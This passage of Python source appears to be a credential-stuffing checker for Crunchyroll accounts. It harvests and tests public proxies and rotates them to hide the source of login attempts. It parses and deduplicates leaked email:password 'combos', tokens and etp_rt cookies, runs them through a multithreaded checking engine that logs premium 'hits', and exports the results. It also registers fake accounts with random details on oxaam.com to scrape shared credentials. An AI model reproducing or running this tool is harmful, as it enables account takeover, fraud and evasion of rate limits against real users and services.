    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
]
PROXY_TEST_URLS = [
    "https://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "https://www.google.com/generate_204",
]

LIVE_PROXIES: List[dict] = []
MANUAL_PROXY_URLS: set = set()
AUTO_PROXY_URLS: set = set()
MANUAL_PX_IDX = [0]
PROXY_SCORES: dict = {}
REFRESH_STATE: dict = {"tested": 0, "live": 0, "total": 0, "start": 0}
REFRESH_STOP_REQUEST = False  # for stop option during refreshing proxy
PROXY_LOCK = threading.Lock()
_refresh_busy = threading.Lock()
LAST_PROXY_HARVEST = 0.0
POOL_FILE = DATA_DIR / "proxies_pool.txt"

def load_proxy_scores():
    global PROXY_SCORES
    try:
        if PROXY_SCORES_FILE.exists():
            PROXY_SCORES = json.loads(PROXY_SCORES_FILE.read_text(encoding="utf-8"))
            logger.info("Loaded proxy scores: %d entries", len(PROXY_SCORES))
    except Exception as e:
        logger.warning("Failed load proxy scores: %s", e)
        PROXY_SCORES = {}

def save_proxy_scores():
    try:
        PROXY_SCORES_FILE.write_text(json.dumps(PROXY_SCORES, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning("Failed save proxy scores: %s", e)

def bump_proxy_score(url: str, delta: int = 1):
    if not url:
        return
    try:
        with PROXY_LOCK:
            PROXY_SCORES[url] = PROXY_SCORES.get(url, 0) + delta
            # cap scores
            if PROXY_SCORES[url] > 100:
                PROXY_SCORES[url] = 100
            if PROXY_SCORES[url] < -10:
                PROXY_SCORES[url] = -10
        # save async occasionally
        if random.random() < 0.1:
            threading.Thread(target=save_proxy_scores, daemon=True).start()
    except Exception:
        pass

def proxy_count() -> int:
    with PROXY_LOCK:
        return len(LIVE_PROXIES)

def get_random_proxy() -> Optional[dict]:
    with PROXY_LOCK:
        if not LIVE_PROXIES:
            return None
        if len(LIVE_PROXIES) > 5 and PROXY_SCORES:
            try:
                scored = sorted(LIVE_PROXIES, key=lambda x: PROXY_SCORES.get(x.get("https",""), 0), reverse=True)
                top = scored[:len(scored)//2]
                if random.random() < 0.7:
                    return random.choice(top)
            except Exception:
                pass
        return random.choice(LIVE_PROXIES)

def pop_random_proxy() -> Optional[dict]:
    with PROXY_LOCK:
        if not LIVE_PROXIES:
            return None
        auto_indices = [i for i, p in enumerate(LIVE_PROXIES) if p.get("https") not in MANUAL_PROXY_URLS]
        if auto_indices:
            try:
                idx = random.choice(auto_indices)
                proxy = LIVE_PROXIES.pop(idx)
                AUTO_PROXY_URLS.discard(proxy.get("https", ""))
                return proxy
            except Exception:
                pass
        try:
            return random.choice(LIVE_PROXIES) if LIVE_PROXIES else None
        except Exception:
            return None

def is_manual_proxy_url(url: str) -> bool:
    return url in MANUAL_PROXY_URLS

def harvest_proxies() -> List[str]:
    raw = set()
    raw_lock = threading.Lock()

    def fetch_one(url: str):
        s = requests.Session()
        for verify in (True, False):
            try:
                r = s.get(url, timeout=8, headers={"User-Agent": BARO_WUA}, verify=verify)
                if r.status_code == 200 and r.text:
                    local = set()
                    for line in r.text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if line.startswith("{") or line.startswith("["):
                            try:
                                j = json.loads(r.text)
                                if isinstance(j, dict) and "data" in j:
                                    for p in j["data"]:
                                        if isinstance(p, dict) and p.get("ip"):
                                            local.add(f"{p['ip']}:{p['port']}")
                                    break
                            except Exception:
                                pass
                            continue
                        if "://" in line:
                            line = line.split("://", 1)[-1]
                        line = line.split("/")[0].split()[0]
                        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                            local.add(line)
                        elif re.match(r"^[a-zA-Z0-9.-]+:\d+$", line) and "." in line:
                            local.add(line)
                    with raw_lock:
                        raw.update(local)
                    break
            except requests.RequestException:
                if verify:
                    continue
                else:
                    break
            except Exception:
                break

    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = [ex.submit(fetch_one, u) for u in PROXY_SOURCES]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception:
                pass
    return list(raw)

def fetch_proxies_from_url(url: str) -> List[str]:
    """Fetch proxies from custom URL (user-provided)"""
    try:
        s = requests.Session()
        r = s.get(url.strip(), timeout=15, headers={"User-Agent": BARO_WUA})
        if r.status_code != 200 or not r.text:
            return []
        proxies = []
        for line in r.text.splitlines():
            line=line.strip()
            if not line or line.startswith("#"):
                continue
            # clean
            if "://" in line:
                # keep as is if already URL
                if re.match(r"^(https?|socks5|socks4)://", line, re.I):
                    proxies.append(line)
                    continue
                line = line.split("://",1)[-1]
            line = line.split()[0]
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line) or re.match(r"^[a-zA-Z0-9.-]+:\d+$", line):
                proxies.append(line)
        return proxies
    except Exception as e:
        logger.warning("fetch_proxies_from_url failed %s: %s", url, e)
        return []

def test_one_proxy(proxy_str: str) -> Optional[dict]:
    schemes = ["http"]
    if SOCKS5_OK:
        schemes.append("socks5")
    for scheme in schemes:
        proxies = {"http": f"{scheme}://{proxy_str}", "https": f"{scheme}://{proxy_str}"}
        for url in PROXY_TEST_URLS:
            try:
                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT,
                                 headers={"User-Agent": BARO_WUA})
                if r.status_code in (200, 204):
                    return proxies
            except requests.RequestException:
                continue
    return None

def test_proxy_url(proxy_url: str) -> Optional[dict]:
    for url in PROXY_TEST_URLS:
        try:
            r = requests.get(url, proxies={"http": proxy_url, "https": proxy_url},
                             timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
            if r.status_code in (200, 204):
                return {"http": proxy_url, "https": proxy_url}
        except requests.RequestException:
            continue
    return None

def refresh_live_proxies(force: bool = False) -> None:
    global LIVE_PROXIES, LAST_PROXY_HARVEST, REFRESH_STOP_REQUEST
    now = time.time()
    with PROXY_LOCK:
        fresh = LIVE_PROXIES and (now - LAST_PROXY_HARVEST) < PROXY_REFRESH_MINUTES * 60
    if not force and fresh:
        return
    if not _refresh_busy.acquire(blocking=False):
        return
    try:
        logger.info("Refreshing live proxy pool...")
        candidates = harvest_proxies()
        if not candidates:
            logger.warning("No proxies harvested")
            return
        random.shuffle(candidates)
        to_test = candidates[:PROXY_TEST_SAMPLE]
        live = []
        REFRESH_STATE["total"] = len(to_test)
        REFRESH_STATE["tested"] = 0
        REFRESH_STATE["live"] = 0
        REFRESH_STATE["start"] = time.time()
        REFRESH_STOP_REQUEST = False
        with ThreadPoolExecutor(max_workers=300) as ex:
            futures = {ex.submit(test_one_proxy, p): p for p in to_test}
            for fut in as_completed(futures):
                if REFRESH_STOP_REQUEST:
                    print("[*] Proxy refresh stopped by user")
                    for f in futures:
                        try:
                            f.cancel()
                        except:
                            pass
                    break
                REFRESH_STATE["tested"] += 1
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    live.append(res)
                    REFRESH_STATE["live"] = len(live)
                    # bump score
                    try:
                        url = res.get("https","")
                        if url:
                            PROXY_SCORES[url] = PROXY_SCORES.get(url, 0) + 1
                    except:
                        pass
                    if len(live) >= MAX_PROXIES_TO_KEEP:
                        for f in futures:
                            f.cancel()
                        break
        if not live and candidates:
            fallback = [{"http": f"http://{c}", "https": f"http://{c}"} for c in candidates[:20]]
            live = fallback
            logger.warning("No live after test — using fallback untested %d", len(live))
        with PROXY_LOCK:
            manual_keep = [p for p in LIVE_PROXIES if p.get("https") in MANUAL_PROXY_URLS]
            LIVE_PROXIES = manual_keep + live
            LAST_PROXY_HARVEST = now
            AUTO_PROXY_URLS.clear()
            for p in live:
                url = p.get("https") or ""
                if url and url not in MANUAL_PROXY_URLS:
                    AUTO_PROXY_URLS.add(url)
        threading.Thread(target=save_proxy_scores, daemon=True).start()
        # Save pool to file for persistence
        try:
            pool_items = [p.get("https","") for p in LIVE_PROXIES if p.get("https")]
            if pool_items:
                pool_save(pool_items)
        except Exception as e:
            logger.warning(f"pool_save failed: {e}")
        logger.info("Live proxies ready: %d auto + %d manual = %d total (tested %d from %d candidates) - AUTO LOAD FIX", len(live), len(manual_keep) if 'manual_keep' in locals() else 0, len(LIVE_PROXIES), len(to_test) if 'to_test' in locals() else 0, len(candidates) if 'candidates' in locals() else 0)
    finally:
        _refresh_busy.release()

def ensure_proxies() -> None:
    if proxy_count() == 0:
        _load_pool_into_live()
        if proxy_count() == 0:
            try:
                logger.info("ensure_proxies: 0 live, force refreshing...")
                refresh_live_proxies(force=True)
            except Exception as e:
                logger.warning(f"ensure_proxies refresh failed: {e}")
                # Fallback: try again with force
                try:
                    refresh_live_proxies(force=True)
                except:
                    pass

def _proxy_loop() -> None:
    while True:
        try:
            auto_on = True
            try:
                auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
            except:
                auto_on = True
            if auto_on:
                pc = proxy_count()
                # Auto proxy load fix - more aggressive refresh when low
                if pc < 50:
                    logger.info(f"Auto proxy load: low proxies {pc} < 50, force refreshing...")
                    refresh_live_proxies(force=True)
                elif pc < 100:
                    refresh_live_proxies(force=False)
                else:
                    refresh_live_proxies(force=False)
                if random.random() < 0.3:
                    try:
                        save_proxy_scores()
                    except:
                        pass
        except Exception as e:
            logger.warning("Proxy loop error: %s", sanitize_log(str(e)))
        # Sleep but check every minute if proxies low
        for _ in range(PROXY_REFRESH_MINUTES):
            time.sleep(60)
            try:
                if proxy_count() < 30:
                    break
            except:
                break

def pool_load() -> List[str]:
    try:
        if POOL_FILE.exists():
            return [l.strip() for l in POOL_FILE.read_text(encoding="utf-8").splitlines() if l.strip()]
    except OSError:
        pass
    return []

def pool_save(items: List[str]):
    try:
        POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
    except OSError as e:
        logger.warning("Pool save failed: %s", e)

def pool_size() -> int:
    return len(pool_load())

def normalize_proxy(line: str) -> Optional[str]:
    line = (line or "").strip()
    if not line:
        return None
    # support many formats
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    # user:pass:ip:port
    parts = line.split(":")
    if len(parts) == 4 and parts[0] and parts[2] and parts[3].isdigit():
        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    # ip:port:user:pass  (some lists)
    if len(parts) == 4 and parts[0].count(".")>=1 and parts[1].isdigit() and parts[2] and parts[3]:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    # ip:port
    if len(parts) == 2 and parts[0] and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    # user:pass@ip:port without scheme
    if "@" in line and ":" in line.split("@")[-1]:
        return f"http://{line}"
    return None

def _merge_live(items: List[dict], is_manual: bool = False):
    with PROXY_LOCK:
        have = {p.get("https") for p in LIVE_PROXIES}
        for p in items:
            url = p.get("https") or p.get("http") or ""
            if url not in have:
                LIVE_PROXIES.append(p)
                have.add(url)
                if is_manual:
                    MANUAL_PROXY_URLS.add(url)
                    AUTO_PROXY_URLS.discard(url)
                else:
                    if url not in MANUAL_PROXY_URLS:
                        AUTO_PROXY_URLS.add(url)

def _load_pool_into_live():
    items = pool_load()
    if items:
        with PROXY_LOCK:
            for u in items:
                MANUAL_PROXY_URLS.add(u)
                AUTO_PROXY_URLS.discard(u)
        _merge_live([{"http": p, "https": p} for p in items], is_manual=True)

def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
    existing = pool_load()
    have = set(existing)
    added = invalid = 0
    for ln in lines:
        p = normalize_proxy(ln)
        if not p:
            if ln.strip():
                invalid += 1
            continue
        if p in have:
            continue
        existing.append(p)
        have.add(p)
        added += 1
        with PROXY_LOCK:
            MANUAL_PROXY_URLS.add(p)
            AUTO_PROXY_URLS.discard(p)
    pool_save(existing)
    if added:
        if auto_check:
            threading.Thread(target=_background_test_pool, daemon=True).start()
        else:
            _merge_live([{"http": p, "https": p} for p in existing], is_manual=True)
    return added, invalid

def _background_test_pool():
    pool_urls = list(set(pool_load()))
    tested = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = {ex.submit(test_proxy_url, p): p for p in pool_urls}
        for fut in as_completed(futs):
            try:
                res = fut.result()
                if res:
                    tested.append(res)
            except Exception:
                continue
    with PROXY_LOCK:
        LIVE_PROXIES[:] = [x for x in LIVE_PROXIES if x.get("https") not in set(pool_urls)]
        for u in pool_urls:
            MANUAL_PROXY_URLS.add(u)
            AUTO_PROXY_URLS.discard(u)
    _merge_live(tested, is_manual=True)
    if not tested and pool_urls:
        fallback = [{"http": p, "https": p} for p in pool_urls[:10]]
        _merge_live(fallback, is_manual=True)
        logger.warning("Pool test 0 live — keeping 10 fallback untested for user (manual high-level)")
    logger.info("Pool auto-check done: %d live from %d pool (manual preserved)", len(tested), len(pool_urls))

def clear_pool():
    global LAST_PROXY_HARVEST
    pool_save([])
    with PROXY_LOCK:
        LIVE_PROXIES.clear()
        MANUAL_PROXY_URLS.clear()
        AUTO_PROXY_URLS.clear()
        MANUAL_PX_IDX[0] = 0
        LAST_PROXY_HARVEST = time.time()

# ===================== CREDENTIAL EXTRACTION + CLEANER =====================
EMAIL_PASS_RE = re.compile(
    r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})"
)
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}")
LABELED_TOKEN_RE = re.compile(
    r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I
)
ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)

def extract_credentials(text: str) -> List[dict]:
    creds: List[dict] = []
    seen = set()
    for m in EMAIL_PASS_RE.finditer(text):
        email, pw = m.group(1), m.group(2)
        key = ("email", email.lower())
        if key not in seen:
            seen.add(key)
            creds.append({"type": "email", "value": email, "password": pw})
    for m in JWT_RE.finditer(text):
        val = m.group(0)
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})
    for m in LABELED_TOKEN_RE.finditer(text):
        val = m.group(1).strip().rstrip("\"'")
        if len(val) < 20 or val.lower().startswith(("null", "undefined")):
            continue
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})
    for m in ETP_RT_RE.finditer(text):
        val = m.group(1).strip()
        key = ("cookie", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "cookie", "value": val})
    return creds

def clean_combos(text: str) -> Tuple[str, dict]:
    """Clean, dedup, normalize combos. Returns (cleaned_text, stats) - FINAL v1"""
    lines = text.splitlines()
    cleaned = []
    seen = set()
    dup = 0
    invalid = 0
    empty = 0
    for line in lines:
        orig = line.strip()
        if not orig:
            empty += 1
            continue
        # skip obvious non-credential lines
        if orig.lower().startswith(("http://", "https://")) and "@" not in orig:
            # could be proxy URL, not combo - count as invalid for combo cleaner
            invalid += 1
            continue
        if ":" in orig and "@" in orig:
            m = EMAIL_PASS_RE.search(orig)
            if m:
                email = m.group(1).strip().lower()
                pw = m.group(2).strip()
                # strict validation
                if len(email) > 254 or len(email) < 5 or len(pw) < 1 or len(pw) > 128:
                    invalid += 1
                    continue
                if "." not in email.split("@")[-1]:
                    invalid += 1
                    continue
                key = f"{email}:{pw}"
                # dedup case-insensitive email, case-sensitive pass
                if key in seen:
                    dup += 1
                    continue
                seen.add(key)
                cleaned.append(f"{email}:{pw}")
            else:
                cleaned_line = orig.replace(" ", "")
                m2 = EMAIL_PASS_RE.search(cleaned_line)
                if m2:
                    email = m2.group(1).lower()
                    pw = m2.group(2)
                    if len(email) > 254 or len(pw) < 1:
                        invalid += 1
                        continue
                    key = f"{email}:{pw}"
                    if key in seen:
                        dup += 1
                        continue
                    seen.add(key)
                    cleaned.append(key)
                else:
                    invalid += 1
        else:
            # token/cookie - keep if long enough and not just numbers
            if len(orig) > 20 and not orig.isdigit():
                if orig not in seen:
                    seen.add(orig)
                    cleaned.append(orig)
                else:
                    dup += 1
            else:
                invalid += 1
    stats = {"total": len(lines), "cleaned": len(cleaned), "dup": dup, "invalid": invalid, "empty": empty}
    return "\n".join(cleaned), stats

# ===================== CHECKER ENGINE v2 =====================
def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> dict:
    # Clean first
    try:
        cleaned_text, clean_stats = clean_combos(text)
        if clean_stats["cleaned"] > 0:
            text = cleaned_text
        else:
            clean_stats = {"total": 0, "cleaned": 0, "dup": 0, "invalid": 0, "empty": 0}
    except Exception:
        clean_stats = {"total": 0, "cleaned": 0, "dup": 0, "invalid": 0, "empty": 0}

    try:
        creds_tmp = extract_credentials(text)
        need = len(creds_tmp)
        have = proxy_count()
        if need > have and need > 10:
            try:
                refresh_live_proxies(force=True)
            except Exception:
                pass
            have2 = proxy_count()
            if have2 < need:
                print(f"[*] 1:1 proxy: need {need}, have {have2}, will cycle")
    except Exception:
        pass

    ensure_proxies()
    creds = extract_credentials(text)
    results = {
        "hits": [], "free": [],
        "bad": 0, "rate": 0, "err": 0, "twofa": 0,
        "total": len(creds), "processed": 0,
        "t0": time.time(),
        "live_feed": [],
        "seconds": 0,
        "cpm": 0,
        "elapsed": 0,
        "clean_stats": clean_stats,
    }
    if not creds:
        results["seconds"] = 0
        return results

    lock = threading.Lock()

    # USER ISOLATION FIX - each user gets local copy, isolated
    with PROXY_LOCK:
        local_proxies = list(LIVE_PROXIES)
        local_manual = set(MANUAL_PROXY_URLS)
    local_idx = [0]

    def next_proxy() -> Optional[dict]:
        nonlocal local_proxies
        if not local_proxies:
            with PROXY_LOCK:
                if LIVE_PROXIES:
                    local_proxies = list(LIVE_PROXIES)[:100]
            if not local_proxies:
                return None
        auto_indices = [i for i, p in enumerate(local_proxies) if p.get("https") not in local_manual]
        if auto_indices:
            try:
                idx = random.choice(auto_indices)
                proxy = local_proxies.pop(idx)
                return proxy
            except:
                try:
                    for i in sorted(auto_indices, reverse=True):
                        try:
                            proxy = local_proxies.pop(i)
                            return proxy
                        except:
                            continue
                except:
                    pass
        if local_proxies:
            try:
                m_idx = local_idx[0] % len(local_proxies)
                local_idx[0] = (local_idx[0] + 1) % 1000000
                return local_proxies[m_idx]
            except:
                try:
                    return random.choice(local_proxies)
                except:
                    return None
        return None

    def worker(cred: dict):
        if uid is not None:
            if STOP_REQUEST.get(uid):
                return cred, "stopped", _blank_data("")
            while PAUSE_REQUEST.get(uid):
                time.sleep(0.3)
                if STOP_REQUEST.get(uid):
                    return cred, "stopped", _blank_data("")
        for attempt in range(3):
            if uid is not None and STOP_REQUEST.get(uid):
                return cred, "stopped", _blank_data("")
            proxy = next_proxy()
            try:
                r = check_credential(cred, proxy)
                if uid is not None and STOP_REQUEST.get(uid):
                    return cred, "stopped", _blank_data("")
                if r["st"] == "rate" and attempt < 2:
                    time.sleep(0.1)
                    continue
                return cred, r["st"], r["data"]
            except Exception as e:
                if uid is not None and STOP_REQUEST.get(uid):
                    return cred, "stopped", _blank_data("")
                if attempt < 2:
                    time.sleep(0.1)
                    continue
                return cred, "err", dict(_blank_data(""), info=_clean_err(e))
        return cred, "err", dict(_blank_data(""), info="no proxy")

    t0 = time.time()
    results["t0"] = t0
    results["stopped"] = False
    results["paused"] = False

    # dynamic threads
    try:
        pc = proxy_count()
        dynamic_threads = min(THREADS, max(50, pc*2), MAX_THREADS_USER)
        if len(creds) < dynamic_threads:
            dynamic_threads = max(10, len(creds))
    except:
        dynamic_threads = THREADS

    with ThreadPoolExecutor(max_workers=dynamic_threads) as ex:
        futures = {ex.submit(worker, c): c for c in creds}
        for fut in as_completed(futures):
            if uid is not None:
                try:
                    if STOP_REQUEST.get(uid):
                        results["stopped"] = True
                        for f in list(futures.keys()):
                            try:
                                f.cancel()
                            except Exception:
                                pass
                        break
                except Exception:
                    pass
            cred = futures[fut]
            try:
                orig_cred, st, d = fut.result()
            except Exception as e:
                orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
            if st == "stopped":
                results["stopped"] = True
                break
            with lock:
                results["processed"] += 1
                try:
                    feed_val = orig_cred.get("value", "") if isinstance(orig_cred, dict) else str(orig_cred)
                    if orig_cred.get("type") == "email":
                        feed_val = orig_cred.get("value", "")
                    else:
                        feed_val = feed_val[:40]
                    results["live_feed"].append(feed_val)
                    if len(results["live_feed"]) > 5:
                        results["live_feed"].pop(0)
                except Exception:
                    pass
                if st == "hit":
                    entry = {"cred": orig_cred, "data": d, "st": "hit"}
                    results["hits"].append(entry)
                    bump_hits(1)
                    # daily stats
                    try:
                        bump_daily_stats("hits", 1)
                    except:
                        pass
                    if hit_callback:
                        try:
                            hit_callback(entry)
                        except Exception:
                            pass
                elif st == "free":
                    results["free"].append({"cred": orig_cred, "data": d, "st": "free"})
                elif st == "bad":
                    results["bad"] += 1
                elif st == "rate":
                    results["rate"] += 1
                elif st == "2fa":
                    results["twofa"] += 1
                else:
                    results["err"] += 1
                elapsed = time.time() - t0
                results["elapsed"] = elapsed
                results["cpm"] = _fmt_cpm_smooth(results["processed"], elapsed)
                if reporter and results["processed"] % 2 == 0:
                    try:
                        reporter.update(results)
                    except Exception:
                        pass
    elapsed = time.time() - t0
    results["seconds"] = round(elapsed, 1)
    results["elapsed"] = elapsed
    results["cpm"] = _fmt_cpm_smooth(results["processed"], elapsed)
    # daily stats bump
    try:
        bump_daily_stats("checks", results["processed"])
        bump_daily_stats("total", 1)
    except:
        pass
    # history
    try:
        if uid:
            add_history(uid, results)
    except:
        pass
    if reporter:
        try:
            reporter.update(results)
            reporter.wait()
        except Exception:
            pass
    return results

def _cred_value(cred: dict) -> str:
    if cred["type"] == "email":
        return f"{cred['value']}:{cred.get('password', '')}"
    return cred["value"]

def make_export(accounts: List[dict], fmt: str = "txt") -> str:
    fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
    os.close(fd)
    p = Path(path)
    if fmt == "json":
        with open(p, "w", encoding="utf-8") as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False, default=str)
    elif fmt == "csv":
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["combo", "type", "status", "plan", "expiry", "days_left", "country", "streams", "price", "auto_renew"])
            for a in accounts:
                d = a.get("data") or {}
                w.writerow([
                    _cred_value(a["cred"]), a["cred"]["type"],
                    "HIT" if a.get("st") == "hit" else "FREE",
                    d.get("plan", ""), d.get("expiry", ""), d.get("days_left", ""),
                    d.get("country_name", ""), d.get("streams", ""), d.get("price",""), d.get("renew",""),
                ])
    else:
        with open(p, "w", encoding="utf-8") as f:
            for a in accounts:
                d = a.get("data") or {}
                status = "HIT" if a.get("st") == "hit" else "FREE"
                flag = flag_emoji(d.get("cc"))
                f.write(
                    f"{_cred_value(a['cred'])} | {status} | Plan: {d.get('plan') or 'Premium'} | "
                    f"Expiry: {d.get('expiry') or '?'} | Days: {d.get('days_left') or '?'} | "
                    f"Country: {flag + ' ' if flag else ''}{d.get('country_name') or '?'} | "
                    f"Streams: {d.get('streams') or '?'}\n"
                )
    return str(p)

# ===================== DAILY STATS & HISTORY =====================
def load_daily_stats():
    try:
        if DAILY_STATS_FILE.exists():
            return json.loads(DAILY_STATS_FILE.read_text(encoding="utf-8"))
    except:
        pass
    return {"hits": 0, "checks": 0, "total": 0, "date": datetime.now().strftime("%Y-%m-%d")}

def save_daily_stats(stats):
    try:
        DAILY_STATS_FILE.write_text(json.dumps(stats, indent=2), encoding="utf-8")
    except:
        pass

def bump_daily_stats(key: str, n: int = 1):
    try:
        stats = load_daily_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        if stats.get("date") != today:
            stats = {"hits": 0, "checks": 0, "total": 0, "date": today}
        stats[key] = stats.get(key, 0) + n
        save_daily_stats(stats)
    except Exception as e:
        logger.warning("bump_daily_stats failed: %s", e)

def add_history(uid: int, results: dict):
    try:
        hist = {}
        if HISTORY_FILE.exists():
            hist = json.loads(HISTORY_FILE.read_text(encoding="utf-8"))
        user_hist = hist.get(str(uid), [])
        entry = {
            "time": now_utc().isoformat(),
            "total": results.get("total",0),
            "hits": len(results.get("hits",[])),
            "free": len(results.get("free",[])),
            "bad": results.get("bad",0),
            "cpm": results.get("cpm",0),
            "seconds": results.get("seconds",0),
        }
        user_hist.append(entry)
        # keep last 20
        user_hist = user_hist[-20:]
        hist[str(uid)] = user_hist
        HISTORY_FILE.write_text(json.dumps(hist, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning("add_history failed: %s", e)

def get_history(uid: int):
    try:
        if HISTORY_FILE.exists():
            hist = json.loads(HISTORY_FILE.read_text(encoding="utf-8"))
            return hist.get(str(uid), [])[-5:]
    except:
        pass
    return []

# Banned users
def load_banned():
    try:
        if BAN_FILE.exists():
            data = json.loads(BAN_FILE.read_text(encoding="utf-8"))
            out = set()
            for x in data:
                try:
                    out.add(int(x))
                except:
                    try:
                        out.add(int(str(x).strip()))
                    except:
                        pass
            return out
    except Exception as e:
        logger.warning("load_banned failed: %s", e)
    return set()

def save_banned(banned_set):
    try:
        BAN_FILE.write_text(json.dumps(list(banned_set), indent=2), encoding="utf-8")
    except:
        pass

BANNED_USERS = load_banned()

# ===================== OXAAM SCRAPER =====================
OXAAM_BASE = "https://www.oxaam.com/"
def _oxaam_headers() -> dict:
    return {
        "User-Agent": BARO_WUA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.oxaam.com",
        "Referer": "https://www.oxaam.com/",
    }
def _find_password(block: str) -> Optional[str]:
    m = re.search(r"[Pp]ass(?:word)?\s*[:=]\s*([^\s<>\"'`,;]{6,})", block)
    if m:
        return m.group(1)
    m = re.search(r"\"password\"\s*:\s*\"([^\"]{6,})\"", block)
    if m:
        return m.group(1)
    return None
def parse_oxaam(html: str):
    if BeautifulSoup is not None:
        try:
            soup = BeautifulSoup(html, "html.parser")
            for details in soup.find_all("details"):
                summary = details.find("summary")
                title = summary.get_text(" ", strip=True) if summary else details.get_text(" ", strip=True)
                if not re.search(r"crunch|krunsh", title, re.I):
                    continue
                block = str(details)
                em = re.search(r"[\w.\-]+@[\w.\-]+\.\w+", block)
                if not em:
                    continue
                email = em.group(0)
                pw = _find_password(block)
                if pw:
                    return email, pw
        except Exception as e:
            logger.warning("Oxaam details-parse failed: %s", e)
    m = EMAIL_PASS_RE.search(html)
    if m:
        return m.group(1), m.group(2)
    return None, None
def oxaam_fetch(proxy: dict | None = None):
    bases = [OXAAM_BASE, OXAAM_BASE.replace("www.", ""), "https://oxaam.com/", "https://www.oxaam.com/"]
    bases = list(dict.fromkeys(bases))
    for base in bases:
        free_url = base.rstrip("/") + "/freeservice.php"
        dash_url = base.rstrip("/") + "/dashboard.php"
        for attempt in range(2):
            name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            email = f"{name}_{random.randint(100, 999)}@gmail.com"
            password = (
                "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                + str(random.randint(100, 999))
                + "@"
                + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
            )
            data = {
                "name": name,
                "email": email,
                "phone": "9" + "".join(random.choices("0123456789", k=9)),
                "password": password,
                "country": "India",
            }
            try:
                s = requests.Session()
                try:
                    s.get(base, headers=_oxaam_headers(), timeout=20, proxies=proxy)
                except Exception:
                    pass
                resp = None
                for reg_url in [base, base.rstrip("/") + "/register.php", base.rstrip("/") + "/signup.php"]:
                    try:
                        resp = s.post(reg_url, data=data, headers=_oxaam_headers(), timeout=30, proxies=proxy)
                        if resp.status_code in (200, 302):
                            break
                    except requests.RequestException:
                        continue
                time.sleep(0.8)
                r = s.get(free_url, headers={**_oxaam_headers(), "Referer": dash_url}, timeout=30, proxies=proxy)
                if r.status_code != 200:
                    continue
                html = r.text or ""
                em, pw = parse_oxaam(html)
                if em and pw:
                    return em, pw
            except requests.RequestException:
                if proxy and attempt == 0:
                    proxy = None
                    continue
            except Exception:
                pass
            time.sleep(1.2)
    return None, None

# ===================== PERSISTENT STORE =====================
class Store:
    def __init__(self, path: Path):
        self.path = path
        self.lock = threading.RLock()
        self.codes: Dict[str, dict] = {}
        self.users: Dict[str, dict] = {}
        self.settings: Dict[str, object] = {}
        self._load()

    def _load(self):
        try:
            if self.path.exists():
                data = json.loads(self.path.read_text(encoding="utf-8"))
                self.codes = data.get("codes", {})
                self.users = data.get("users", {})
                self.settings = data.get("settings", {})
        except Exception as e:
            logger.warning("Store load failed: %s", e)

    def save(self):
        with self.lock:
            try:
                tmp = self.path.with_suffix(".tmp")
                tmp.write_text(
                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings},
                               indent=2),
                    encoding="utf-8",
                )
                os.replace(tmp, self.path)
            except Exception as e:
